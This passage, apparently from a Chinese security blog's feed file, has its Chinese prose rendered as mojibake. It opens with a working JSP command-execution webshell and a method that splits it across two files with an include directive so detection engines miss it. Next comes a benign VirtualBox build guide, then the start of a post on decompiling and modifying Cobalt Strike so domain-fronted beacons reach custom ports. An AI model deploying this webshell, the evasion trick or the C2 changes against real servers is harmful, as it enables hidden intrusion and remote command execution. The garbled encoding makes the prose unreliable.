å¯¹è±¡çš„æ–¹æ³•ï¼Œåªæœ‰ request.getSchema() ç­‰å†…å®¹ä¸å¯æ§æ–¹æ³•çš„æ—¶å€™ä¸ä¼šæ€ï¼Œå†…å®¹ä¸å¯æ§æœ‰å•¥ç”¨:(</p><p>ç ”ç©¶äº†ä¸‹ï¼Œæˆ‘æƒ³åˆ°äº†è¿™ä¸ªå¼•æ“çš„é—®é¢˜ï¼ˆåº”è¯¥ä¹Ÿé€šæ€åˆ«çš„ï¼‰ï¼Œå°±æ˜¯åœ¨æ£€æµ‹æ—¶ï¼Œæ— æ³•æ„é€ å‡ºå®Œæ•´çš„ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚å®ƒæ˜¯å•æ–‡ä»¶ä¸€ä¸ªä¸ªæ‰«è¿‡å»çš„ï¼Œå¦‚æœæˆ‘ä»¬æ‹†åˆ† soure-sink åˆ°å¤šä¸ªæ–‡ä»¶å‘¢ï¼Œæ‰«ä»»æ„ä¸€ä¸ªjspéƒ½æ²¡é—®é¢˜ã€‚ç”šè‡³å¾ˆå¯èƒ½å› ä¸ºé€šä¸è¿‡ç¼–è¯‘ï¼Œå‹æ ¹å„¿åŠ¨æ€ç›‘æµ‹ä¸èµ·æ¥ã€‚</p><h1 id="include"><a href="#include" class="headerlink" title="include"></a>include</h1><p>ä¸‹é¢ç”¨åˆ° jsp çš„ä¸€ä¸ªç‰¹æ€§ include æŒ‡ä»¤ã€‚</p><blockquote><p>include æŒ‡ä»¤ç”¨äºé€šçŸ¥ JSP å¼•æ“åœ¨ç¿»è¯‘å½“å‰ JSP é¡µé¢æ—¶ï¼Œå°†å…¶ä»–æ–‡ä»¶ä¸­çš„å†…å®¹åˆå¹¶è¿›å½“å‰ JSP é¡µé¢è½¬æ¢æˆçš„ Servlet æºæ–‡ä»¶ä¸­ï¼Œè¿™ç§åœ¨æºæ–‡ä»¶çº§åˆ«è¿›è¡Œå¼•å…¥çš„æ–¹å¼ï¼Œç§°ä¸ºé™æ€å¼•å…¥ï¼Œå½“å‰ JSP é¡µé¢ä¸é™æ€å¼•å…¥çš„æ–‡ä»¶ç´§å¯†ç»“åˆä¸ºä¸€ä¸ª Servletã€‚è¿™äº›æ–‡ä»¶å¯ä»¥æ˜¯ JSP é¡µé¢ã€HTML é¡µé¢ã€æ–‡æœ¬æ–‡ä»¶æˆ–æ˜¯ä¸€æ®µ Java ä»£ç ã€‚</p></blockquote><p>æˆ‘ä»¬å®Œå…¨å¯ä»¥æŠŠå®Œæ•´çš„é€»è¾‘æ‹†åˆ†ï¼Œå³æŠŠå‚æ•°è·å–å’Œå‘½ä»¤æ‰§è¡Œçš„åˆ†å¼€ã€‚</p><p>ä¸¾ä¸ªä¾‹å­</p><p>AB.jsp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;javax.el.ELProcessor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    ELProcessor processor = new ELProcessor();</span><br><span class="line">    Process process = (Process) processor.eval(</span><br><span class="line">            &quot;\&quot;\&quot;.getClass()&quot; +</span><br><span class="line">                    &quot;.forName(\&quot;javax.script.ScriptEngineManager\&quot;).&quot; +</span><br><span class="line">                    &quot;newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&apos;(java.lang.String[])&apos;]([&apos;&quot; +</span><br><span class="line">                    cmd + &quot;&apos;]).start()\&quot;)&quot;);</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">        sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getOutputStream().write(sb.toString().getBytes());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>source request.getParameterï¼Œé€šè¿‡ sink ELProcessor.eval æ‰§è¡Œå‘½ä»¤ï¼Œä¼šè¢«æ€ã€‚</p><p>æ‹†åˆ†é€»è¾‘åˆ° A.jsp B.jsp</p><p>A.jsp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>B.jsp ELProcessor.eval æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.el.ELProcessor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@include file=&quot;A.jsp&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    ELProcessor processor = new ELProcessor();</span><br><span class="line">    Process process = (Process) processor.eval(</span><br><span class="line">            &quot;\&quot;\&quot;.getClass()&quot; +</span><br><span class="line">                    &quot;.forName(\&quot;javax.script.ScriptEngineManager\&quot;).&quot; +</span><br><span class="line">                    &quot;newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&apos;(java.lang.String[])&apos;]([&apos;&quot; +</span><br><span class="line">                    cmd + &quot;&apos;]).start()\&quot;)&quot;);</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">        sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getOutputStream().write(sb.toString().getBytes());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>A.jsp åªè´Ÿè´£å–å‚ï¼Œçœ‹èµ·æ¥æ²¡æœ‰é—®é¢˜ã€‚</p><p>B.jsp sinkæ²¡æœ‰è¢«ç¡¬æ€ï¼Œè€Œä¸”ç¼ºå°‘ A.jsp çš„æƒ…å†µç¼–è¯‘ä¸è¿‡ï¼Œè·‘ä¸èµ·æ¥åŠ¨æ€ç›‘æµ‹ä¸äº†ã€‚</p><p>å®Œå…¨ç»•è¿‡ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> RedTeam </tag>
            
            <tag> çº¢è“å¯¹æŠ— </tag>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MacOS ä¸‹ç¼–è¯‘ VirtualBox</title>
      <link href="/2021/01/03/compile-virtualbox-on-macos10-15/"/>
      <url>/2021/01/03/compile-virtualbox-on-macos10-15/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ç¼–è¯‘ VBox çš„æ—¶å€™é‡åˆ°äº†è®¸å¤šå‘ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p><p>ç¯å¢ƒæ˜¯ MacOS 10.15 Catalinaï¼ŒVBox 6.1.16 ã€‚</p><h1 id="å®‰è£…SDK"><a href="#å®‰è£…SDK" class="headerlink" title="å®‰è£…SDK"></a>å®‰è£…SDK</h1><p>Xcode10ä¹‹åç¼–è¯‘ç³»ç»Ÿæ”¹äº†ï¼Œæˆ‘ä»¬éœ€è¦ç”¨è€ç‰ˆæœ¬çš„Xcodeç¼–è¯‘ï¼Œæ‰€ä»¥è¦ç”¨ <a href="https://github.com/devernay/xcodelegacy" target="_blank" rel="noopener">XcodeLegacy</a> ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone --depth=1 https://hub.fastgit.org/devernay/xcodelegacy.git</span><br><span class="line">cd xcodelegacy</span><br></pre></td></tr></table></figure><p>å†ä¸‹è½½ <a href="https://download.developer.apple.com/Developer_Tools/Xcode_6.4/Xcode_6.4.dmg" target="_blank" rel="noopener">Xcode6.4</a> ï¼Œæ”¾åˆ° xcodelegacy ç›®å½•ä¸‹ã€‚</p><p>å®‰è£…ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./XcodeLegacy.sh -osx109 buildpackages</span><br><span class="line">sudo ./XcodeLegacy.sh -osx109 install</span><br></pre></td></tr></table></figure><h1 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h1><ul><li>å®‰è£… homebrewï¼Œ<code>brew install libidl openssl pkg-config qt</code></li><li>JDKç‰ˆæœ¬&gt;=6 ï¼Œæˆ‘ç”¨çš„ JDK8</li><li>openssl</li></ul><h2 id="ç¼–è¯‘-openssl"><a href="#ç¼–è¯‘-openssl" class="headerlink" title="ç¼–è¯‘ openssl"></a>ç¼–è¯‘ openssl</h2><p>link çš„æ—¶å€™å¯èƒ½ä¼šå› ä¸ºç›®æ ‡ç‰ˆæœ¬ä¸ä¸€è‡´å‡ºç°é—®é¢˜ï¼Œéœ€è¦ç”¨ 10.9 ç¼–è¯‘çš„ openssl</p><p>ä¸‹è½½ <a href="https://www.openssl.org/source/openssl-1.1.1i.tar.gz" target="_blank" rel="noopener">openssl</a> ï¼Œè§£å‹åç¼–è¯‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./config CFLAGS=&quot;-g -O2 -mmacosx-version-min=10.9 -isysroot /Developer/SDKs/MacOSX10.9.sdk&quot; CXXFLAGS=&quot;-g -O2 -mmacosx-version-min=10.9 -isysroot /Developer/SDKs/MacOSX10.9.sdk&quot; LDFLAGS=&quot;-mmacosx-version-min=10.9 -isysroot /Developer/SDKs/MacOSX10.9.sdk&quot; --prefix=/usr/local/opt/openssl@1.1.1i</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h1 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h1><p>ä¸‹é¢å¼€å§‹ç¼–è¯‘ï¼Œä¸­é€”å¯èƒ½è¿˜ä¼šæœ‰äº›ç¼–è¯‘é”™è¯¯ï¼Œéœ€è¦è‡ªå·±è§£å†³ä¸€ä¸‹ã€‚æœ«å°¾æœ‰æˆ‘é‡åˆ°çš„é—®é¢˜åŠè§£å†³ã€‚</p><p>å…ˆä¿®æ”¹ configure çš„ check_darwinversion()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">check_darwinversion()</span><br><span class="line">&#123;</span><br><span class="line">  test_header &quot;Darwin version&quot;</span><br><span class="line">  darwin_ver=`uname -r`</span><br><span class="line">  case &quot;$darwin_ver&quot; in</span><br><span class="line">+    19\.*)</span><br><span class="line">+      check_xcode_sdk_path &quot;$WITH_XCODE_DIR&quot;</span><br><span class="line">+      [ $? -eq 1 ] || fail</span><br><span class="line">+      darwin_ver=&quot;10.15&quot; # Catalina</span><br><span class="line">+   sdk=$WITH_XCODE_DIR/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.9.sdk</span><br><span class="line">+      cnf_append &quot;VBOX_WITH_MACOSX_COMPILERS_FROM_DEVEL&quot; &quot;1&quot;</span><br><span class="line">+      cnf_append &quot;VBOX_PATH_MACOSX_DEVEL_ROOT&quot; &quot;$WITH_XCODE_DIR/Developer&quot;</span><br><span class="line">+      CXX_FLAGS=&apos;--std=c++11&apos;</span><br><span class="line">+      ;;</span><br><span class="line">    17\.*)</span><br><span class="line">      check_xcode_sdk_path &quot;$WITH_XCODE_DIR&quot;</span><br><span class="line">      [ $? -eq 1 ] || fail</span><br><span class="line">      darwin_ver=&quot;10.13&quot; # High Sierra</span><br><span class="line">      sdk=$WITH_XCODE_DIR/Developer/SDKs/MacOSX10.6.sdk</span><br><span class="line">      cnf_append &quot;VBOX_WITH_MACOSX_COMPILERS_FROM_DEVEL&quot; &quot;1&quot;</span><br><span class="line">      cnf_append &quot;VBOX_PATH_MACOSX_DEVEL_ROOT&quot; &quot;$WITH_XCODE_DIR/Developer&quot;</span><br><span class="line">      ;;</span><br></pre></td></tr></table></figure><p>é…ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --disable-hardening --with-xcode-dir=/Developer/SDKs/MacOSX10.9.sdk \</span><br><span class="line">--with-openssl-dir=/usr/local/opt/openssl@1.1.1i --with-qt-dir=/usr/local/Cellar/qt/5.15.2</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ tools/kBuildTools/VBoxXcode62.kmk ï¼Œå¼€å¯ c++11 æ”¯æŒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-TOOL_VBoxXcode62_CXXFLAGS         ?=</span><br><span class="line">+TOOL_VBoxXcode62_CXXFLAGS         ?= --std=c++11</span><br><span class="line"></span><br><span class="line">-TOOL_VBoxXcode62_OBJCXXFLAGS          ?=</span><br><span class="line">+TOOL_VBoxXcode62_OBJCXXFLAGS          ?= --std=c++11</span><br></pre></td></tr></table></figure><p>ä¸€å¤„ç¨‹åºé”™è¯¯ src/VBox/Devices/USB/darwin/USBProxyDevice-darwin.cpp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-    AssertReturn(RefMatchingDict != IO_OBJECT_NULL, VERR_OPEN_FAILED);</span><br><span class="line">+    AssertReturn(RefMatchingDict, VERR_OPEN_FAILED);</span><br></pre></td></tr></table></figure><p>å¼€å§‹ç¼–è¯‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source env.sh</span><br><span class="line">kmk</span><br></pre></td></tr></table></figure><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><ul><li><p>æŠ¥é”™ <code>yasm: Bad CPU type in executable</code></p><p>å› ä¸ºä¸æ”¯æŒ 32 ä½åº”ç”¨ï¼Œéœ€è¦ç”¨ x64 çš„ yasm æ›¿æ¢ï¼Œ</p><p><code>brew install yasm &amp;&amp; cp /usr/local/Cellar/yasm/1.3.0_2/bin/yasm tools/darwin.amd64/bin/</code></p></li><li><p>æŠ¥é”™ <code>kBuild: iasl VBoxDD ....</code></p><p>é—®é¢˜åŒä¸Šï¼Œæ‰¾ x64 çš„ iasl æ›¿æ¢ï¼Œ<a href="https://bitbucket.org/RehabMan/acpica/downloads/iasl.zip" target="_blank" rel="noopener">https://bitbucket.org/RehabMan/acpica/downloads/iasl.zip</a> ,</p><p><code>cp iasl tools/darwin.amd64/bin/iasl</code></p></li><li><p>æ‰¾ä¸åˆ° libqcocoa.dylib</p><p>ä¿®æ”¹ AutoConfig.kmk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- PATH_SDK_QT5_INC               := /usr/local/Cellar/qt/5.15.2/Frameworks</span><br><span class="line">- PATH_SDK_QT5_LIB               := /usr/local/Cellar/qt/5.15.2/Frameworks</span><br><span class="line">- PATH_SDK_QT5                   := /usr/local/Cellar/qt/5.15.2/Frameworks</span><br><span class="line"></span><br><span class="line">+ PATH_SDK_QT5_INC               := /usr/local/Cellar/qt/5.15.2/include</span><br><span class="line">+ PATH_SDK_QT5_LIB               := /usr/local/Cellar/qt/5.15.2/lib</span><br><span class="line">+ PATH_SDK_QT5                   := /usr/local/Cellar/qt/5.15.2/</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>é­”æ”¹ CobaltStrike 3.14 å®ç°åŸŸå‰ç½®è‡ªå®šä¹‰ç«¯å£</title>
      <link href="/2020/04/10/pentest-cobaltstrike-improve/"/>
      <url>/2020/04/10/pentest-cobaltstrike-improve/</url>
      
        <content type="html"><![CDATA[<p>å›½å†…VPSçš„ 80,443 ç«¯å£é»˜è®¤éƒ½æ˜¯éœ€è¦å¤‡æ¡ˆæ‰èƒ½ä½¿ç”¨ï¼Œæ‰€ä»¥å¦‚æœ TeamServer æ­åœ¨å›½å†…ï¼ŒListener åªèƒ½é€‰æ‹©å…¶ä»–ç«¯å£ï¼Œä¸€èˆ¬ä½¿ç”¨æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœè¦é…ç½®åŸŸå‰ç½®ï¼Œä¼šé‡åˆ°ä¸Šçº¿ä¸äº†çš„é—®é¢˜ã€‚</p><h1 id="é—®é¢˜åˆ†æ"><a href="#é—®é¢˜åˆ†æ" class="headerlink" title="é—®é¢˜åˆ†æ"></a>é—®é¢˜åˆ†æ</h1><p>æˆ‘é…ç½®äº†ä¸€ä¸ª 8880 ç«¯å£çš„ listenerï¼Œå¹¶é…ç½®äº† CloudFront ï¼ˆå›æºç«¯å£ 8880ï¼‰ï¼Œç”Ÿæˆäº†æŒ‡å‘ 80 ç«¯å£çš„åé—¨ã€‚ä½†è¿è¡Œåå¹¶æ²¡æœ‰ä¸Šçº¿ï¼ŒWireshark æŠ“åŒ…åˆ†æä¸€ä¸‹ã€‚</p><blockquote><p>ä¸ºäº†ç”ŸæˆæŒ‡å‘ 80 ç«¯å£çš„åé—¨ï¼Œæˆ‘é¢å¤–é…ç½®äº†ä¸€ä¸ª 80 ç«¯å£çš„ listenerã€‚</p></blockquote><p>å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€æ­¥ç¡®å®å‘ cdn è¯·æ±‚äº†ï¼Œä¹ŸæˆåŠŸä» teamserver è·å¾—äº†åç»­çš„ shellcode å¹¶åŠ è½½æˆåŠŸäº†(ä¸ç„¶ä¸ä¼šæœ‰ç¬¬äºŒæ­¥çš„è¯·æ±‚)ï¼Œä½†æ˜¯ç¬¬äºŒæ­¥å¼€å§‹å‘ 8880 ç«¯å£æ‹‰å–ä»»åŠ¡äº†ï¼Œè¿™é‡Œå°±å‡ºé—®é¢˜äº†ï¼Œå› ä¸º cdn åŸŸåçš„ 8880 å¹¶ä¸èƒ½åˆ°è¾¾ teamserver çš„ 8880ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹ç¬¬äºŒæ­¥çš„è¯·æ±‚ï¼Œå¼ºåˆ¶è®©å®ƒç»§ç»­å’Œ 80 ç«¯å£é€šä¿¡ã€‚</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal1.jpg" alt="p1"></p><p>é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆç¬¬ä¸€æ­¥çš„è®¿é—®çš„ç«¯å£æ˜¯å¯¹çš„ï¼Œç¬¬äºŒä¸ªæ˜¯é”™çš„å‘¢ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ä¸€èˆ¬ç”¨çš„CSåé—¨æ˜¯ staging æ¨¡å¼çš„ï¼Œæ‰§è¡Œè¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ† stage å’Œ stager ã€‚ç¬¬ä¸€æ­¥æ‰§è¡Œçš„æ˜¯ stager ï¼Œè´Ÿè´£é€šè¿‡å„ç§è·¯å¾„ï¼ˆhttp&amp;https&amp;tcpï¼‰ä¸‹è½½ stageï¼Œç„¶åæ³¨å…¥åˆ°å†…å­˜ä¸­æ‰§è¡Œã€‚ç¬¬äºŒæ­¥çš„ stage æ˜¯çœŸæ­£å®ç°åé—¨åŠŸèƒ½çš„éƒ¨åˆ†ã€‚</p><p>å› ä¸ºç”Ÿæˆ beacon æ—¶ï¼Œç”¨çš„ listener æ˜¯ç›‘å¬ 80 ç«¯å£çš„ï¼Œæ‰€ä»¥ beacon ç¬¬ä¸€æ¬¡è¯·æ±‚çš„ç¡®æ˜¯å‘ 80 ç«¯å£å‘èµ·çš„ã€‚</p><p>ä½†å®é™…ä¸Š cdn çš„ 80 ç«¯å£æŒ‡å‘çš„æ˜¯ 8880 ç«¯å£çš„ listenerï¼Œ8880 æ¥åˆ°è¯·æ±‚ï¼Œä¼šè¿”å› stageï¼Œstage æ—¶åœ¨ teamserver ç”Ÿæˆçš„ï¼Œå®ƒå¹¶ä¸çŸ¥é“æˆ‘ä»¬æ˜¯åœ¨é€šè¿‡ 80 ç«¯å£è®¿é—®å®ƒï¼Œæ­¤æ—¶çš„ stage æ˜¯æŒ‡å‘ 8880 çš„ã€‚è¿™é€ æˆäº†åç»­çš„è¯·æ±‚éƒ½ä¼šæŒ‡å‘ 8880ã€‚</p><p>è¦è§£å†³é—®é¢˜ï¼Œå¿…é¡»ä¿®æ”¹ teamserver ç”Ÿæˆçš„ stage æŒ‡å‘çš„ç«¯å£ï¼Œä½†æœäº†ä¸€å¤§åœˆï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°ç›¸å…³çš„è§£å†³æ–¹æ³•ï¼ŒAggressorScript ä¹Ÿåªèƒ½åœ¨å®¢æˆ·ç«¯åŠ¨åŠ¨åˆ€å­ï¼Œæƒ³è¦ä¿®æ”¹ Listener ç›¸å…³çš„å¾—è¦ä»æ ¹æºå…¥æ‰‹ã€‚</p><h1 id="æ€æ­»é—®é¢˜çš„åŠæ³•-â€”â€”-é­”æ”¹"><a href="#æ€æ­»é—®é¢˜çš„åŠæ³•-â€”â€”-é­”æ”¹" class="headerlink" title="æ€æ­»é—®é¢˜çš„åŠæ³• â€”â€” é­”æ”¹"></a>æ€æ­»é—®é¢˜çš„åŠæ³• â€”â€” é­”æ”¹</h1><p>æˆ‘çš„æ€è·¯æ˜¯åœ¨åˆ›å»º listener çš„æ—¶å€™ï¼Œå†åŠ ä¸€ä¸ªé€‰é¡¹ï¼Œè®© stage ç”¨çš„ç«¯å£å’Œ listener å®é™…ç›‘å¬çš„ç«¯å£åˆ†å¼€ã€‚</p><blockquote><p>å½“ç„¶åšğŸ‘‡è¿™äº›ä¹‹å‰è¦å…ˆåç¼–è¯‘ï¼Œæˆ‘è¿™é‡Œç”¨çš„ <code>fernflower</code> ï¼Œç”¨æ³•ç•¥è¿‡ã€‚</p></blockquote><h2 id="0x01-UI"><a href="#0x01-UI" class="headerlink" title="0x01 UI"></a>0x01 UI</h2><p>CobaltStrike ç”¨çš„æ˜¯ swing å†™çš„ UIï¼Œåˆ›å»º Listener çš„éƒ¨åˆ†åœ¨ <code>aggressor.dialogs.ListenerDialog.show()</code></p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal4.jpg" alt="p4"></p><p>ç”¨äº† DialogManager åŒ…è£…äº†æ¯ä¸ª Dialogï¼Œè°ƒç”¨ <code>DialogManager.text</code> å¯ä»¥åœ¨å½“å‰ dialog åˆ›å»ºè¾“å…¥æ¡†ï¼Œå‘½åä¸º <code>bind port</code>ï¼Œä½œä¸ºå®é™…ç›‘å¬çš„ç«¯å£ã€‚</p><p>æ¥åŠ ä¸€ä¸ªè¾“å…¥æ¡†ï¼š</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal6.jpg" alt="p6"></p><p>å½“ <code>Save</code> æŒ‰é’®æŒ‰ä¸‹æ—¶ï¼Œä¼šåœ¨åç»­è§¦å‘åˆ° <code>ListenerDialog.dialogResult</code></p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal5.jpg" alt="p5"></p><p>è¿™é‡Œæ£€æŸ¥äº†ä¸€ä¸‹ domain æ˜¯å¦è¶…é•¿ï¼Œé€šè¿‡äº†ï¼Œå°±æ¨é€ä¸€ä¸ª <code>listeners.create</code> è¯·æ±‚åˆ° teamserverï¼Œå‚æ•°æ˜¯ listener çš„åå­—å’Œé…ç½®ä¿¡æ¯ï¼Œå†ä¹‹å listener å°±ä¼šåœ¨ teamserver å»ºç«‹ã€‚</p><p>æˆ‘ä»¬ä¸‹ä¸€æ­¥æ˜¯è¦æŠŠ <code>bind port</code> ä¼ åˆ° <code>this.options</code>ï¼Œè¿™é‡Œæœ‰ç‚¹ç»•ï¼Œåœ¨è°ƒç”¨ <code>DialogManager.text</code> çš„æ—¶å€™åˆ›å»ºä¸€ä¸ªå†…éƒ¨çš„ <code>DialogListener</code>ã€‚</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal7.jpg" alt="p7"></p><p>åœ¨ <code>DialogManager.addDilogListenerInternal</code> å¯ä»¥çœ‹åˆ°ä¼šæŠŠåˆ›å»ºçš„ <code>DialogListener</code> åŠ åˆ°</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal9.jpg" alt="p9"></p><p><code>Save</code> æŒ‰é’®å®é™…æ˜¯ <code>DialogManager.action_noclose</code> ç”Ÿæˆçš„<br>è¿™é‡Œçš„ï¼Œç‚¹å‡»äº‹ä»¶å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal10.jpg" alt="p10"></p><p>è¿™é‡Œè°ƒç”¨äº†ä¹‹å‰çš„åˆ›å»ºçš„åŒ¿å <code>DialogListener</code>ï¼Œå°†å€¼ä¼ åˆ° <code>this.options</code>ï¼Œæ‰€ä»¥åˆ›å»ºçš„è¾“å…¥æ¡†ä¼šè‡ªåŠ¨æŠŠå€¼æ·»åŠ åˆ°é…ç½®é‡Œæ¥ï¼ŒğŸ˜­ç»•äº†ä¸€åœˆå•¥ä¹Ÿä¸ç”¨å¹²ã€‚</p><p>ä¸ºäº†èƒ½åœ¨ <code>Listeners</code> è¿™ä¸ª Tab ç›´æ¥çœ‹åˆ°è®¾ç½®çš„ <code>bind port</code>ï¼Œ ç»™ <code>aggressor.windows.ListenerManager</code> çš„ <code>cols</code> åŠ ä¸Š <code>bind port</code> å°±ä¼šè‡ªåŠ¨åŠ è½½è¿›æ¥äº†ã€‚</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal13.jpg" alt="p13"></p><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal12.jpg" alt="p12"></p><h2 id="0x02-Listener"><a href="#0x02-Listener" class="headerlink" title="0x02 Listener"></a>0x02 Listener</h2><p>åœ¨å„å¤„è°ƒç”¨ Listener æ—¶ï¼Œä¼šåˆ›å»º <code>common.Listener</code> å®ä¾‹ï¼Œé‡Œé¢æ˜¯æ²¡æœ‰ <code>bind port</code> 